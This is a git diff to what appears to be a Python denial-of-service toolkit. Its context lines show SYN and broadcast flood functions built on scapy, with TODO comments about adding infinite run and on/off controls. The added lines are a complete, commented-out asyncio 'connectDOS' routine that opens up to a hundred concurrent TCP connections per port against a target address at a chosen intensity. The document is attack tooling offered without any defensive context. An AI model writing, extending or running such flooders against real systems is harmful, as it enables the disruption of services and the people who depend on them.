@@ -1,5 +1,6 @@
 import socket
 import time
+import asyncio
 from scapy.all import IP, TCP, send
 
 def synFlood(src, dst, sport, dport, frames, selectedInterface):
@@ -50,3 +51,66 @@ def broadcastFlood(frames, selectedInterface):
 #Most functions should have an infinite otion. This can be figured out later
 #these functions should have an on off switch.
 #probably have to be async or something 
+
+
+
+
+
+
+
+
+
+
+# async def connect_to_ip(ip, port, delay, stop_event, attempt_counter):
+#     while not stop_event.is_set():
+#         attempt_number = next(attempt_counter)
+#         try:
+#             reader, writer = await asyncio.open_connection(ip, port)
+#             print(f"Connected to {ip}:{port} on attempt {attempt_number}")
+#             writer.close()
+#             await writer.wait_closed()
+#         except Exception as e:
+#             print(f"Attempt {attempt_number}: Connection to port {port} failed: {e}")
+#         await asyncio.sleep(delay)
+
+# def attempt_counter():
+#     count = 1
+#     while True:
+#         yield count
+#         count += 1
+
+# def input_with_validation(prompt, type_=None, min_=None, max_=None, range_=None):
+#     while True:
+#         try:
+#             value = type_(input(prompt))
+#             if (min_ is not None and value < min_) or (max_ is not None and value > max_) or (range_ is not None and value not in range_):
+#                 raise ValueError
+#             return value
+#         except ValueError:
+#             print(f"Invalid input. Please enter a valid value in the range {range_ if range_ is not None else (min_, max_)}.")
+
+# async def connectDOS(ip_address, ports, attempts, delay, intensity):
+#     stop_event = asyncio.Event()
+#     counter = attempt_counter()
+
+#     tasks_per_port = 1 if intensity == 0 else (100 if intensity == 5 else max(1, 10 * intensity))
+#     tasks = []
+
+#     for port in ports:
+#         for _ in range(tasks_per_port):
+#             task = asyncio.create_task(connect_to_ip(ip_address, port, delay, stop_event, counter))
+#             tasks.append(task)
+
+#     if attempts > 0:
+#         await asyncio.sleep(attempts * delay)
+#         stop_event.set()
+
+#     try:
+#         await asyncio.gather(*tasks)
+#     except asyncio.CancelledError:
+#         stop_event.set()
+#         print("\nProgram interrupted. Closing all connections...")
+#     finally:
+#         for task in tasks:
+#             task.cancel()
+#         await asyncio.gather(*tasks, return_exceptions=True)
